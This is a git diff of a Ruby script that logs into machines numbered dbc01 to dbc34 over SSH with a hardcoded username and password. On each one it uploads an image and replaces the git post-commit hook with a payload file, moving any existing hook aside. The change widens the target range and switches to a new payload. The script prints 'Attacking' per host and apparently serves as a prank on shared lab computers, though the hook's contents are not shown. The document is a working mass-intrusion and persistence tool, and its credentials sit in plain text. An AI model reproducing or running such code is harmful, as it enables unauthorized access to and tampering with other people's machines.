@@ -12,6 +12,11 @@ def install_zorak(box)
   box.file_upload("payloads/zorak.png", "#{$assets_path}/zorak.png")
 end
 
+def install_more_you_know(box)
+  box.mkdir("#{$assets_path}") if box.ls($assets_path).code == 1
+  box.file_upload("payloads/more-you-know.png", "#{$assets_path}/more-you-know.png")
+end
+
 def install_imageleap(box)
   find_result = box.mdfind("imageleap")
   if find_result.code == 0 and find_result.stdout.to_s == ""
@@ -24,11 +29,11 @@ def install_imageleap(box)
   end
 end
 
-def install_post_commit(box)
+def install_post_commit(box, file = "all-your-base.rb")
   box.mkdir("#{$git_templates_path}") if box.ls("#{$git_templates_path}").code == 1
   box.mkdir("#{$git_hooks_path}") if box.ls("#{$git_hooks_path}").code == 1
   box.execute("mv #{$git_hooks_path}/post-commit #{$git_hooks_path}/post-commit.backup-#{DateTime.now}") if box.ls("#{$git_hooks_path}/post-commit").code == 0
-  box.file_upload("payloads/all-your-base.rb", "#{$git_hooks_path}/post-commit")
+  box.file_upload("payloads/#{file}", "#{$git_hooks_path}/post-commit")
   box.execute("chmod a+x #{$git_hooks_path}/post-commit")
 end
 
@@ -43,7 +48,8 @@ def attack(box)
   configure_githooks(box)
 end
 
-dbc_hosts = (16..34).map{ |number| "dbc%02d.local" % number }
+# Computers numbered 1 through 34
+dbc_hosts = (1..34).map{ |number| "dbc%02d.local" % number }
 user = 'apprentice'
 password = 'mvclover'
 
@@ -51,7 +57,8 @@ dbc_hosts.each do |dbc_host|
   begin
     box = Rye::Box.new(dbc_host, user: user, safe: false, password: password, password_prompt: false, quiet: true)
     puts "Attacking #{box.host}..."
-    attack(box)
+    install_more_you_know(box)
+    install_post_commit(box, "more-you-know.rb")
     puts "Done Attacking #{box.host}."
     puts
   rescue
